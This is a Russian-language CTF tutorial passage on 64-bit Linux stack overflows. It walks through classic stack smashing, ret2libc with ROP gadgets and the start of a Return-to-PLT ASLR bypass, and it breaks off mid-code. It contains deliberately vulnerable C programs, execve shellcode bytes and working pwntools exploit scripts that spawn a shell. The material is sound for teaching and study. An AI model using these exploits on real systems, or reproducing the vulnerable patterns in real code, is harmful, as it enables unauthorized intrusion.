---
layout: post
title: "В королевстве PWN. ROP-цепочки и атака Return-to-PLT в CTF Bitterman"
date: 2019-11-23 18:00:00 +0300
author: snovvcrash
categories: /ctf
tags: [xakepru, write-up, ctf, pwn-64, linux, gdb-weaponize, buffer-overflow, stack-smashing, getenvaddr, dep-bypass, ret2libc, rop, rop-chain, r2, ROPgadget, ropper, pwntools, aslr-bypass, address-leak, got, plt, ret2plt, libc-database, ghidra]
published: true
---

[//]: # (2019-10-23)

В этой статье мы поговорим об особенностях переполнения стека в 64-битном Linux. Начнем с прохождения трех обучающих кейсов для различных сценариев выполнения Stack Overflow в Ubuntu 19.10 x64. Далее на примере таска Bitterman, представленном на соревновании CAMP CTF 2015, используя возможности модуля pwntools, мы построим эксплоит, демонстрирующий техники Return-oriented programming для обмана запрета исполнения DEP/NX и Return-to-PLT для байпаса механизма рандомизации адресов ASLR без брутфорса.

<!--cut-->

> В королевстве PWN
> 
> В этом цикле статей **срыв стека** бескомпромиссно правит бал:
> 
> 1. [Препарируем классику переполнения стека](https://snovvcrash.github.io/2019/10/20/classic-stack-overflow.html)
> 2. [Обходим DEP и брутфорсим ASLR в «Октябре»](https://snovvcrash.github.io/2019/11/08/htb-october.html)
> 3. **➤**{:.green} [ROP-цепочки и атака Return-to-PLT в CTF Bitterman](https://snovvcrash.github.io/2019/11/23/bitterman.html)
> 4. [Return-to-bss, криптооракулы и реверс-инжиниринг против Великого Сокрушителя](https://snovvcrash.github.io/2019/12/20/htb-smasher.html)

<p align="right">
    <a href="https://xakep.ru/2019/10/23/ctf-bitterman/"><img src="https://img.shields.io/badge/%5d%5b-%d0%a5%d0%b0%d0%ba%d0%b5%d1%80-red?style=flat-square" alt="xakep-badge.svg" /></a>
</p>

![banner.png](/assets/images/pwn-kingdom/bitterman/banner.png)
{:.center-image}

* TOC
{:toc}

[*Приложения*](https://github.com/snovvcrash/xakepru/tree/master/pwn-kingdom/3-bitterman)

# Ликбез по срыву стека для архитектуры x86-64

Сперва по традиции <strike>не</strike>много теории.

В этом параграфе мы обсудим основные аспекты overflow'а в 64-битных системах на основе ОС Linux. Я составил **три** импровизированных кейса, поочередно изучив которые у тебя будут все необходимые знания для PWN'а бинарника Bitterman.

Первый кейс покажет различия в эксплуатации Stack Smashing относительно этой же атаки в 32-битной ОС (о которой мы говорили [в первой части](https://snovvcrash.github.io/2019/10/20/classic-stack-overflow.html)) в случае, когда у нарушителя есть возможность размещения и выполнения шелл-кода в адресном пространстве стека — то есть с отключенными защитами DEP/NX и ASLR.

Второй кейс поможет разобраться в проведении атаки ret2libc для x86-64 (ее 32-битный аналог был рассмотрен [во второй части](https://snovvcrash.github.io/2019/11/08/htb-october.html)). Здесь мы обсудим, какие регистры использует 64-битный ассемблер Linux при формировании стековых кадров, а также посмотрим, что в сущности из себя представляет концепция Return-oriented programming (ROP). Механизм DEP/NX активен, ASLR — нет.

В третьем кейсе я покажу вариацию ROP-атаки для триггера утечки адреса загрузки разделяемой библиотеки libc (методика Return-to-PLT или ret2plt) для обхода ASLR без необходимости запуска перебора. DEP/NX и ASLR активны.

От последнего этапа мы перейдем непосредственно к исследованию Bitterman, который к этому моменту уже не будет представлять для тебя сложности.

## Стенд

Для этой статьи я установил свежую 64-битную [Ubuntu 19.10](https://ubuntu.com/download/desktop/thank-you?country=RU&version=19.10&architecture=amd64) с gcc версии 8.3.0.

```
$ uname -a
Linux pwn-3 5.0.0-31-generic #33-Ubuntu SMP Mon Sep 30 18:51:59 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

Из дополнительного ПО я установил интерпретатор Python 2.7, который перестали поставлять по умолчанию с дистрибутивом (все переходят на 3-ю версию питона).

```
$ sudo apt install python2.7 -y
$ sudo update-alternatives --install /usr/bin/python2 python2 /usr/bin/python2.7 1
```

Вторая версия пригодится нам для модуля pwntools, который мы поставим чуть позже.

### Вооружение GDB

В прошлых статьях мы использовали [PEDA](https://github.com/longld/peda) в качестве основного обвеса для дебаггера, однако я знал, что на сегодняшний день существуют более продвинутые тулзы для апгрейда GDB (к тому же PEDA больше не поддерживается разработчиком), а именно: [GEF](https://github.com/hugsy/gef) и [pwndbg](https://github.com/pwndbg/pwndbg). Изучая эти инструменты, я нашел изобретательный [пост](https://medium.com/bugbountywriteup/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8), в котором рассказывается, как одновременно установить вышеупомянутый софт и переключаться между ним по одному нажатию. Мне понравилась идея, но не реализация, поэтому я набросал свой [скрипт](https://github.com/snovvcrash/xakepru/blob/master/pwn-kingdom/3-bitterman/gdb_weaponize.sh), позволяющий в одно действие инсталлировать все 3 ассистента, после чего запуск каждого из которых будет происходить следующими командами соответственно.

```
$ gdb-peda [ELF-файл]
$ gdb-gef [ELF-файл]
$ gdb-pwndbg [ELF-файл]
```

В рамках этой статьи мы продолжим юзать PEDA, потому что для него удобнее всего делать скриншоты.

## Кейс № 1. Классический срыв стека

Уязвимый исходный код.

```c
/**
 * Buffer Overflow (64-bit). Case 1: Classic Stack Smashing
 * Compile: gcc -g -fno-stack-protector -z execstack -no-pie -o classic classic.c
 * ASLR: Off (sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space')
 */

#include <stdio.h>

void vuln() {
	char buffer[100];
	gets(buffer);
}

int main(int argc, char* argv[]) {
	puts("Buffer Overflow (64-bit). Case 1: Classic Stack Smashing\n");
	vuln();

	return 0;
}
```

В наших изысканиях всему виной будет функция `vuln`, содержащая вызов уязвимой процедуры чтения из буфера `gets`, которая уже стала эталоном небезопасного кода.

> Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.

Даже `man` [кричит](http://man7.org/linux/man-pages/man3/gets.3.html) о том, что ни в каких случаях не следует использовать `gets`, ведь этой функции наплевать на то, каков размер переданного ей буфера — она прочитает из него все, пока содержимое не кончится.

Скомпилируем программу без запрета исполнения данных в стеке и отключим ASLR.

```
$ gcc -g -fno-stack-protector -z execstack -no-pie -o classic classic.c
$ sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```

[![classic-compile.png](/assets/images/pwn-kingdom/bitterman/classic-compile.png)](/assets/images/pwn-kingdom/bitterman/classic-compile.png)
{:.center-image}

Получив порцию негодования от GCC из-за использования `gets`, мы собрали 64-битный исполняемый файл `classic`.

[![classic-checksec.png](/assets/images/pwn-kingdom/bitterman/classic-checksec.png)](/assets/images/pwn-kingdom/bitterman/classic-checksec.png)
{:.center-image}

Скрипт `checksec.py`, идущий в комплекте с модулем pwntools и доступный из командной строки, говорит о том, что бинарь никак не защищен. Это нам и нужно для демонстрации первого кейса.

Запустим отладчик и попробуем получить контроль над регистром RIP, ответственным за хранения адреса возврата, в момент завершения работы функции `vuln`.

### Некоторые изменения в логике x86-64

Регистры процессора

* Все регистры общего назначения расширены до 64 бит: `EAX->RAX`, `EBX->RBX`, `ECX->RCX`, `EDX->RDX`, `ESI->RSI`, `EDI->RDI`, `EBP->RBP` (база стекового кадра), `ESP->RSP` (вершина стека).
* Введено 8 дополнительных регистров общего назначения: `R8..R15`.
* Служебный регистр-указатель на текущую исполняемую команду также расширен до 64 бит: `EIP->RIP`.

Память

* Размер указателя стал равен 8 байтам.
* Инструкции работы со стеком `push` и `pop` оперируют значениями размером 8 байт.
* [Каноническая форма](https://en.wikipedia.org/wiki/X86-64#Canonical_form_addresses) адреса виртуальной памяти имеет вид `0x00007FFFFFFFFFFF` (то есть, в сущности, используются только 6 наименьших значащих байт).

Функции

* Аргументы для функций теперь размещаются в регистрах и в стеке: первые 6 аргументов подаются через регистры в порядке `RDI, RSI, RDX, RCX, R8, R9`, последующие — помещаются в стек.

Хорошее чтиво по теме: [What happened when it goes to 64 bit?](http://www.renyujie.net/articles/article_ca_x86_3.php)

### Proof-of-Concept

Как обычно будем пользоваться `pattern create` для генерации циклического [паттерна де Брёйна](https://ru.wikipedia.org/wiki/Последовательность_де_Брёйна), который мы скормим программе.

[![classic-pattern-create.png](/assets/images/pwn-kingdom/bitterman/classic-pattern-create.png)](/assets/images/pwn-kingdom/bitterman/classic-pattern-create.png)
{:.center-image}

Этим действием, как и планировалось, мы вышли за границы отведенного буфера.

[![classic-overflow-exception.png](/assets/images/pwn-kingdom/bitterman/classic-overflow-exception.png)](/assets/images/pwn-kingdom/bitterman/classic-overflow-exception.png)
{:.center-image}

Однако несмотря на то, что отрывки нашего паттерна можно наблюдать на стеке (синим), адрес возврата (красным) перезаписать не удалось. Всему виной каноническая форма виртуальной адресации, имеющая вид `0x00007FFFFFFFFFFF`, где задействованы лишь младшие 48 бит (6 байт). В случае, если процессор видит «неканонический» адрес (в котором первые 2 значащих байта отличны от нуля), будет вызвано исключение, и контроля над RIP мы точно не получим.

Чтобы перезапись удалась, посмотрим, что находится в RSP, и посчитаем смещение.

[![classic-pattern-offset.png](/assets/images/pwn-kingdom/bitterman/classic-pattern-offset.png)](/assets/images/pwn-kingdom/bitterman/classic-pattern-offset.png)
{:.center-image}

Нам нужно 120 байт, чтобы добраться до RIP. Исходя из этого, напишем небольшой PoC-скрипт на Python, демонстрирующий возможность перезаписи адреса возврата.

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# Использование: python pwn-classic-poc.py

import struct


def little_endian(num):
	"""Упаковка адреса в формат little-endian (x64)."""
	return struct.pack('<Q', num)


junk = 'A' * 120
ret_addr = little_endian(0xd34dc0d3)

payload = junk + ret_addr

with open('payload.bin', 'wb') as f:
	f.write(payload)
```

Квалификатор `<Q` упакует нужный адрес в 64-битный little-endian формат.

[![classic-rip-overwrite.png](/assets/images/pwn-kingdom/bitterman/classic-rip-overwrite.png)](/assets/images/pwn-kingdom/bitterman/classic-rip-overwrite.png)
{:.center-image}

Таким образом RIP поддается для перезаписи произвольным значением.

### Боевая полезная нагрузка

Чтобы не мучиться с вычислением адреса загрузки шелл-кода в стеке, воспользуемся техникой (описанной в [Hacking: The Art of Exploitation](https://repo.zenk-security.com/Magazine%20E-book/Hacking-%20The%20Art%20of%20Exploitation%20(2nd%20ed.%202008)%20-%20Erickson.pdf), 142 стр.) размещения полезной нагрузки в переменной окружения.

Идея вкратце: адрес любой переменной окружение может быть найден с помощью простой программы на C (функция `getenv`), следовательно, если разместить в такой переменной шелл-код, то можно точно узнать его адрес, что избавляет хакера от необходимости возиться с NOP-срезами. Интересно то, что на расположение шелл-кода относительно стекового пространства данной программы влияет имя последней.

Клонируем [репозиторий](https://github.com/historypeats/getenvaddr) с нужным исходником, соберем программу и инициализируем переменную окружения `SHELLCODE` [этой нагрузкой](http://shell-storm.org/shellcode/files/shellcode-905.php) (29 байт).

```
$ git clone https://github.com/historypeats/getenvaddr tmp
$ mv tmp/getenvaddr.c .
$ gcc -o getenvaddr getenvaddr.c
$ rm -rf tmp/ getenvaddr.c
$ export SHELLCODE=`python -c 'print "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"'`
```

После чего узнаем адрес `SHELLCODE`.

```
$ ./getenvaddr SHELLCODE classic
SHELLCODE will be at 0x7fffffffe3f8
```

Подкорректируем немного наш скрипт, и у нас все готово для эксплуатации!

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# Использование: python pwn-classic.py

import struct


def little_endian(num):
	"""Упаковка адреса в формат little-endian (x64)."""
	return struct.pack('<Q', num)


junk = 'A' * 120
ret_addr = little_endian(0x7fffffffe3f8)

payload = junk + ret_addr

with open('payload.bin', 'wb') as f:
	f.write(payload)
```

[![classic-pwn.png](/assets/images/pwn-kingdom/bitterman/classic-pwn.png)](/assets/images/pwn-kingdom/bitterman/classic-pwn.png)
{:.center-image}

Обрати внимание на использование конструкции `cat payload.bin; echo; cat` с идущей за ней конвейерной передачей для того, чтобы поток ввода `stdin` оставался открытым после отправки пейлоада, и мы смогли вводить команды.

Разобрались. Перейдем к следующему кейсу.

## Кейс № 2. Return-to-libc

Уязвимый исходный код.

```c
/**
 * Buffer Overflow (64-bit). Case 2: Return-to-libc
 * Compile: gcc -g -fno-stack-protector -no-pie -o ret2libc ret2libc.c
 * ASLR: Off (sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space')
 */

#include <stdio.h>

void rop_gadgets() {
	asm("pop %rdi; ret");
	asm("nop; ret");
	asm("ret");
}

void vuln() {
	char buffer[100];
	gets(buffer);
}

int main(int argc, char* argv[]) {
	puts("Buffer Overflow (64-bit). Case 2: Return-to-libc\n");
	vuln();

	return 0;
}
```

Исходник изменился только в одном — добавилась вспомогательная функция `rop_gadgets` [с ассемблерными вставками](https://ru.wikipedia.org/wiki/Ассемблерная_вставка), о предназначении которой поговорим далее.

При компиляции честно откажемся от настройки `-z execstack`, отключающей DEP/NX.

```
$ gcc -g -fno-stack-protector -no-pie -o ret2libc ret2libc.c
$ sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```

[![ret2libc-compile.png](/assets/images/pwn-kingdom/bitterman/ret2libc-compile.png)](/assets/images/pwn-kingdom/bitterman/ret2libc-compile.png)
{:.center-image}

### ROP-цепочки

Единственное существенное отличие 64-битной версии атаки ret2libc от ее 32-разрядной предшественницы заключается в том, что аргумент для библиотечной функции `system` (строка `"/bin/sh"`) пушится не в стек, а помещается в регистр RDI. В связи с этим возникает логичный вопрос: «Как изменить поведение программы таким образом, чтобы в нужный момент она записала адрес `"/bin/sh"` в RDI?»

Здесь нам на помощь и приходит широко известная концепция <strike>развратно</strike>[возвратно-ориентированного программирования](https://ru.wikipedia.org/wiki/Возвратно-ориентированное_программирование) (ROP), которая заключается в «переиспользовании» уже существующих в памяти машинных инструкций. К слову, Return-to-libc, по сути, является всего лишь частным случаем ROP.

> «Видишь, как все просто? Процессор — это глупый кусок кремния: он всего лишь выполняет простейшие операции с крохотными порциями байтов» — фраза из [работы](http://blog.jpauli.tech/2016-11-30-on-c-performances-html/) французского исследователя Жюльена Паулина, которая отлично подходит к нашему случаю.

Язык ассемблера по сути представляет из себя просто набор мнемоник для опкодов процессора — символические представления машинных инструкций. Но сам процессор (в силу утверждения выше) не способен оценить уместность выполнения той или иной инструкции в текущем контексте — он просто выполнит опкод, на который указывает регистр RIP в данный момент. Поэтому, если где-то в обозримой памяти процесса существует инструкция, содержащая байт `5f`, за которым следует `c3`, то процессор выполнит `pop rdi; ret`, если «ткнуть его носом» в нужное смещение (ведь `5fc3` [означает](https://defuse.ca/online-x86-assembler.htm) ничто иное, как `pop rdi; ret`).

[![online-x86-assembler.png](/assets/images/pwn-kingdom/bitterman/online-x86-assembler.png)](/assets/images/pwn-kingdom/bitterman/online-x86-assembler.png)
{:.center-image}

С помощью `xxd`, к примеру, можно найти все смещения в нашем исполняемом файле, по которым расположена нужная цепочка байт (или по-другому «ROP-гаджет»).

```
$ xxd -c1 ret2libc | grep -A1 ' 5f' | grep -B1 ' c3'
00001136: 5f  _
00001137: c3  .
--
000011eb: 5f  _
000011ec: c3  .
```

Конечно, такой подход поиска гаджетов не самый удобный, поэтому существует не один инструмент, позволяющий автоматизировать этот процесс. Не считая темной магии pwntools, к которой мы вернемся при решении Bitterman, на ум приходят 3 способа генерации ROP-цепочек:

1. с помощью мощного Unix-like фреймворка для реверс-инжиниринга [Radare2](https://github.com/radareorg/radare2);
2. с помощью проекта [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) от автора уже известного нам блога [shell-storm.org](http://shell-storm.org/);
3. с помощью прямого наследника ROPgadget — более универсального инструмента [Ropper](https://scoding.de/ropper/).

Попробуем каждый из них в деле.

Так выглядит поиск ROP-чейнов с помощью Radare2.

```
$ r2 ret2libc
[0x00401050]> /R pop rdi
```

[![rop-radare2.png](/assets/images/pwn-kingdom/bitterman/rop-radare2.png)](/assets/images/pwn-kingdom/bitterman/rop-radare2.png)
{:.center-image}

ROPgadget в своем арсенале имеет удобную опцию `depth`, позволяющую задать максимальное количество звеньев в цепочке, которую ты ищешь.

```
$ ROPgadget --binary ret2libc --ropchain --rawArch=x86-64 --depth 2 | grep 'pop rdi ; ret'
$ ROPgadget --binary ret2libc --opcode 5fc3
```

[![rop-ropgadget.png](/assets/images/pwn-kingdom/bitterman/rop-ropgadget.png)](/assets/images/pwn-kingdom/bitterman/rop-ropgadget.png)
{:.center-image}

А Ropper понимает регулярные выражения и может быть использован не только для поиска гаджетов.

```
$ ropper --file ret2libc --arch x86_64 --search 'pop ?di; ret'
$ ropper --file ret2libc --arch x86_64 --disasm 5fc3
```

[![rop-roppper.png](/assets/images/pwn-kingdom/bitterman/rop-roppper.png)](/assets/images/pwn-kingdom/bitterman/rop-roppper.png)
{:.center-image}

Сколько утилит, столько и ответов — тебе решать, чем пользоваться.

Однако по поводу одного из найденных гаджетов согласились все три инструмента — того, что находится по смещению `0x401136`. Если обратить внимание на вывод `xxd`, то можно видеть то же смещение `0x001136`, благодаря чему напрашивается вывод, что базовый адрес загрузки программы — `0x400000`. Проверить это можно с помощью `readelf`.

```
$ readelf -l ret2libc | grep -m1 LOAD
LOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000
```

Предполагаю, что именно в это место в исполняемом файле была скомпилирована вставка `asm("pop %rdi; ret")` из функции `rop_gadgets` исходного кода, назначение которой, думаю, уже стало очевидным — эта «читерская» функция-помощник, благодаря которой я точно уверен, что найду нужный гаджет в бинарнике.

#### Защита от ROP

Достаточно долгое время единственной защитой от ROP-атак являлся механизм ASLR. Однако в частых случаях он не является значимым препятствием для нарушителя: адрес libc можно перебрать [методом грубой силы](https://snovvcrash.github.io/2019/11/08/htb-october.html#обход-aslr--метод-грубой-силы) (если речь идет о 32-битных системах), или воспользоваться несовершенством написанного кода, абьюзя библиотечные функции, чтобы спровоцировать утечку памяти (как будет показано на примере заключительного тренировочного кейса).

Стремление IT-гигантов устранить возможность проведения таких атак можно наблюдать на примере попыток воплощения в жизнь концепции [CFI](https://ru.wikipedia.org/wiki/Control-flow_integrity) (Control-flow integrity) — как на аппаратном уровне ([CET](https://www.theregister.co.uk/2016/06/10/intel_control_flow_enforcement/) от Intel), так и на софтверном ([XGuard CFI](https://www.youtube.com/watch?v=OD7rSdke7hM) от Karamba Security).

### Разработка сплоита

На чем мы остановились... Ах да, был скомпилирован исполняемый файл `ret2libc`.

Вот, что говорит о нем `checksec`.

[![ret2libc-checksec.png](/assets/images/pwn-kingdom/bitterman/ret2libc-checksec.png)](/assets/images/pwn-kingdom/bitterman/ret2libc-checksec.png)
{:.center-image}

DEP включен, все по плану.

Пейлоад для PWN'а `ret2libc` будет иметь примерно такой вид.

```
ПЕЙЛОАД = 
	(1) МУСОР_120_байт +
	(2) ГАДЖЕТ_pop_rdi +
	(3) СТРОКА_bin_sh +
	(4) АДРЕС_system +
	(5) АДРЕС_exit
```

1. Через 120-байтовое заполнение мы доберемся до точки перезаписи регистра RIP.
2. ROP-гаджет `pop rdi; ret` положит в регистр RDI (где функция `system` будет искать свой первый аргумент) значение, которое лежит на вершине стека (строку `"/bin/sh"` из пункта 3), и передаст управление следующей инструкции (вызов `system` из пункта 4).
3. Тот самый аргумент для `system`, который окажется в RSP на момент выполнения `pop rdi`.
4. Собственно, гвоздь программы — функция `system` из libc, которая подарит нам шелл.
5. Функция `exit` из libc, которая перехватит управление после того, как мы наиграемся с шеллом, и не позволит программе завершиться ошибкой сегментации.

Так как для наших экспериментов используется функция `gets`, которая [умеет читать нулевые байты](https://stackoverflow.com/a/5068460) (в отличии от `strcpy`, например), можно не беспокоиться о конкатенации разных частей пейлоада.

Теперь самое время познакомиться с питоновским модулем pwntools, призванным превратить разработку низкоуровневых эксплоитов в одно удовольствие.

[pwntools](https://github.com/Gallopsled/pwntools) — сторонний модуль для Python, разрабатываемый специально для применения в CTF-кампаниях для тасков категории PWN, который отнюдь не следует философии Unix — он умеет делать много, но как ни странно, умеет делать это хорошо.

Установка сводится к простой команде менеджеру пакетов. Мы будем ставить stable-версию (для Python 2), ведь не смотря на то, что разработчики уже представили бету для третьего питона, багов там все еще слишком много, чтобы нормально ей пользоваться (в основном, трудности портирования связаны с различиями в механизмах работы с кодировками).

```
$ sudo -H python2 -m pip install --upgrade pwntools
```

Имей в виду, что в довесок к самому модулю будет установлена туча сторонних зависимостей, поэтому я бы не рекомендовал делать это на основном хосте не из виртуальной среды.

Ссылка на информативную документацию (которая впрочем иногда не открывается без VPN'а): [docs.pwntools.com](http://docs.pwntools.com/en/stable/)

Работать с модулем несложно, а код получается интуитивно понятным, поэтому я прокомментирую только основные моменты.

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# Использование: python pwn-ret2libc.py [DEBUG]

from pwn import *

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64
context.terminal  = ['tmux', 'new-window']

junk = 'A' * 120
pop_rdi_gadget = p64(0x401136)
system_addr = p64(0x7ffff7e1ffd0)
bin_sh_addr = p64(0x7ffff7f7cb84)
exit_addr = p64(0x7ffff7e143c0)

payload = junk + pop_rdi_gadget + bin_sh_addr + system_addr + exit_addr

with open('payload.bin', 'wb') as f:
	f.write(payload)

p = process('./ret2libc')

"""
gdb.attach(p, '''
init-peda
start''')

# Нужен raw_input(), когда юзаешь gdb.debug() вместо gdb.attach()
"""

p.recvuntil('Case 2: Return-to-libc')
raw_input('[?] Отправляю пейлоад?')
p.sendline(payload)

p.interactive()
```

* *(строки 6-12)* Первым делом импортируем модуль и задаем основные настройки окружения. Удобно, что есть поддержка `tmux`, благодаря которой pwntools умеет открывает отладчик в новом окне.
* *(строки 14-23)* Далее формируется полезная нагрузка, шаблон которой мы обсудили выше. Смещение ROP-гаджета уже было найдено, а адреса остальных частей пейлоада можно добыть с помощью отладчика, как мы делали это [здесь](https://snovvcrash.github.io/2019/11/08/htb-october.html#1-адрес-загрузки-libc). Функция `p64`, как ты мог догадаться, выполняет то же самое, что и `little_endian` в сплоите из первого кейса.
* *(строки 25 и 35-39)* Непосредственно взаимодействие с исполняемым файлом: отправка пейлоада и переход в интерактивный режим для взаимодействия с полученным шеллом.
* *(строки 27-33)* Работа с отладчиком на этапе разработки, что очень помогает отлавливать свои ошибки в процессе тестирования эксплоита.

Попробуем запустить на исполнение.

[![ret2libc-pwn-fail.png](/assets/images/pwn-kingdom/bitterman/ret2libc-pwn-fail.png)](/assets/images/pwn-kingdom/bitterman/ret2libc-pwn-fail.png)
{:.center-image}

Шелл мы не получили, и, как можно видеть, процесс упал с сегфолтом. Если запустить скрипт с параметром `DEBUG`, можно получить больше фидбека от pwntools.

[![ret2libc-pwn-fail-debug.png](/assets/images/pwn-kingdom/bitterman/ret2libc-pwn-fail-debug.png)](/assets/images/pwn-kingdom/bitterman/ret2libc-pwn-fail-debug.png)
{:.center-image}

Это не прояснило ситуацию, поэтому пойдем в отладчик смотреть, что же, на самом деле, происходит.

Поставим точку останова на возврате из функции `vuln`, скормим бинарнику содержимое файла `payload.bin`, куда мы записали пейлоад, и сделаем шаг вперед.

```
gdb-peda$ b *0x401159
gdb-peda$ r < payload.bin
gdb-peda$ si
```

[![ret2libc-pwn-peda-1.png](/assets/images/pwn-kingdom/bitterman/ret2libc-pwn-peda-1.png)](/assets/images/pwn-kingdom/bitterman/ret2libc-pwn-peda-1.png)
{:.center-image}

На этом этапе RIP указывает на первую инструкцию нашего гаджета `pop rdi`, а в RSP находится строка `"/bin/sh"`, которая через мгновение окажется в RDI.

```
gdb-peda$ si
```

[![ret2libc-pwn-peda-2.png](/assets/images/pwn-kingdom/bitterman/ret2libc-pwn-peda-2.png)](/assets/images/pwn-kingdom/bitterman/ret2libc-pwn-peda-2.png)
{:.center-image}

После перехода к следующей инструкции в RIP оказалась оставшаяся часть ROP-гаджета `ret`, а RSP теперь указывает на `system`, куда и будет передано управления. Обрати внимание на значение указателя в RSP (`0x7fffffffded8`) — оно станет ключом к понимаю проблемы.

```
gdb-peda$ si
```

[![ret2libc-pwn-peda-3.png](/assets/images/pwn-kingdom/bitterman/ret2libc-pwn-peda-3.png)](/assets/images/pwn-kingdom/bitterman/ret2libc-pwn-peda-3.png)
{:.center-image}

И вот здесь программа крашится. В чем дело?

На самом деле, все просто: начиная с версии 18.04 и по настоящий момент (версия 19.10), в дистрибутиве Ubuntu используется ревизия библиотеки GLIBC, содержащая инструкцию `movaps` в реализации некоторых функций — в том числе `do_system` (ядро функции `system`). В 64-битном ассемблере эта инструкция [требует](https://stackoverflow.com/a/54399217), чтобы стек был выравнен на 16-байтную границу при передаче управления таким функциям. «Выравнен на 16-байтную границу» — то же самое, что «значение RSP делится на 0x10», а у нас это значение равно `0x7fffffffded8`. Подробности об этой особенности можно найти в этом [посте](https://ropemporium.com/guide.html) по ключевой фразе The MOVAPS issue.

Решение тривиально: добавить к нашему пейлоаду гаджет с инструкцией NOP (`nop; ret`) или просто еще один `ret`. Это увеличит стек на одну ячейку (8 байт), тем самым уменьшив значение адреса его вершины (так как стек растет вниз). Именно столько нам нужно, чтобы значение RSP делилось на 0x10: `0x7fffffffded8 - 0x8 = 0x7fffffffded0`.

Найдем местоположение гаджета с NOP-ом.

```
$ ropper --file ret2libc --arch x86_64 --search 'nop; ret'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: nop; ret

[INFO] File: ret2libc
0x00000000004010af: nop; ret;
```

И модифицируем наш пейлоад.

```python
...
nop_gadget = p64(0x4010af)
payload = junk + pop_rdi_gadget + bin_sh_addr + nop_gadget + system_addr + exit_addr
...
```

Теперь все работает, как нужно, и я получаю честно заработанный шелл.

[![ret2libc-pwn-success.png](/assets/images/pwn-kingdom/bitterman/ret2libc-pwn-success.png)](/assets/images/pwn-kingdom/bitterman/ret2libc-pwn-success.png)
{:.center-image}

Го ласт кейс!

## Кейс № 3. Return-to-PLT

Уязвимый исходный код.

```c
/**
 * Buffer Overflow (64-bit). Case 3: Return-to-PLT
 * Compile: gcc -g -fno-stack-protector -no-pie -o ret2plt ret2plt.c
 * ASLR: On
 */

#include <stdio.h>

void rop_gadgets() {
	asm("pop %rdi; ret");
	asm("nop; ret");
	asm("ret");
}

void vuln() {
	char buffer[100];
	gets(buffer);
}

int main(int argc, char* argv[]) {
	puts("Buffer Overflow (64-bit). Case 3: Return-to-PLT\n");
	vuln();

	return 0;
}
```

Не считая названия кейса, исходник не изменился с прошлого раза.

Соберем и активируем ASLR.

```
$ gcc -g -fno-stack-protector -no-pie -o ret2plt ret2plt.c
$ sudo sh -c 'echo 2 > /proc/sys/kernel/randomize_va_space'
```

[![ret2plt-compile.png](/assets/images/pwn-kingdom/bitterman/ret2plt-compile.png)](/assets/images/pwn-kingdom/bitterman/ret2plt-compile.png)
{:.center-image}

Мнение `checksec` об исполняемом файле.

[![ret2plt-checksec.png](/assets/images/pwn-kingdom/bitterman/ret2plt-checksec.png)](/assets/images/pwn-kingdom/bitterman/ret2plt-checksec.png)
{:.center-image}

Так как включен механизм рандомизации ASLR, то адрес libc будет меняться с каждым вызовом программы. Но разве нас когда-нибудь пугали трудности?

### Как «слить» адрес libc и ничего не заметить

Ключом к понимаю Return-to-PLT и некоторых смежных с нею типов атак (на подобии GOT Overwrite) является знание строения секций `.plt` (`.got.plt`) и `.got` (`.plt.got`).

Исполняемый ELF-файл, как ты знаешь, разделен на различные секции, некоторые из которых содержат необходимую информацию (в виде таблиц поиска) для процедуры [переразмещения](https://en.wikipedia.org/wiki/Relocation_(computing)) (relocations) адресного пространства. Многие функции исполняемого файла не зашиты непосредственно в бинарник, а подгружаются компоновщиком динамически из разделяемых библиотек (по типу libc) в ходе работы процесса. Вместо того, чтобы хранить захардкоженные адреса этих функций (что было бы бессмысленно по разным причинам — в силу активности того же ASLR, к примеру), в ELF-файл на место этих функций помещаются специальные «заглушки», которые будут резолвлены позже. Здесь на помощь и приходят переразмещения.

**PLT** (Procedure Linkage Table) — таблица компоновки процедур, используемая для вызовов таких «внешних» функций. Она содержит те самые «заглушки» (специальные вспомогательные функции), которые в зависимости от ситуации либо прыгают на код реальных функций, либо обращаются к компоновщику, чтобы это сделал он. В последнем случае (когда неизвестная функция встречается в исполняемом файле впервые), «заглушка» тревожит компоновщик, чтобы тот пришел на помощь и помог отыскать настоящий адрес неизвестной функции.

**GOT** (Global Offset Table) — глобальная таблица смещений, содержащая реальные адреса неизвестных сущностей, которые загружаются динамически в процессе исполнения. После того, как компоновщик уже однажды нашел внешнюю функцию, ее смещение заносится в GOT (перезаписывая то, что было там раньше), чтобы не инициировать поиск повторно.

Про PLT и GOT можно говорить долго, это тема отдельной статьи. Вот хорошие материалы, которые освещают на эту тему более подробно.

* [PLT and GOT - the key to code sharing and dynamic libraries](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html)
* [GOT and PLT for pwning](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)

Основная идея заключается в том, что в некоторых случаях, когда программа выводит что-то на экран, есть шанс вытащить из нее тот самый (случайный) адрес загрузки разделяемой библиотеки прозрачно для самой программы. Это сработает, когда в роли функции печати на экран выступает `puts`. Мы достигнем этого путем вызова «заглушки» функции `puts` в качестве аргумента для которой будет использовано значение из GOT — так как `puts` еще не был найден к этому моменту, компоновщик сделает это за нас, а `puts` выведет адрес самой себя на экран, и мы сможем посчитать смещение до начала libc. Все будет более понятно, когда мы проделаем это вживую.

В упрощенном виде продемонстрировать то, что мы собираемся вытащить из исполняемого файла, можно с помощью тривиального Proof-of-Concept'а на C.

```c
// gcc -o poc-ret2plt poc-ret2plt.c

#include <stdio.h>

int main(int argc, char* argv[]) {
	char addr[16];
	sprintf(addr, "%p", &puts);
